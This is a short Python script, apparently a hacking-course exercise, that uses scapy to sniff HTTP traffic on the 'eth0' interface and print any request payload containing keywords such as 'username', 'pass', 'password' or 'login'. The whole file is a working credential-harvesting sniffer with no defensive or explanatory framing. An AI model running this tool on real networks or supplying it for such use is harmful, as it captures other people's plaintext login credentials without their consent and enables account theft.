import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(store=False, iface=interface, prn=process_sniffed_packets)


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            lst = ['uname', 'username', 'pass', 'password', 'login']
            for i in lst:
                if i in load:
                    print(load)
                    break
                    

sniff('eth0')
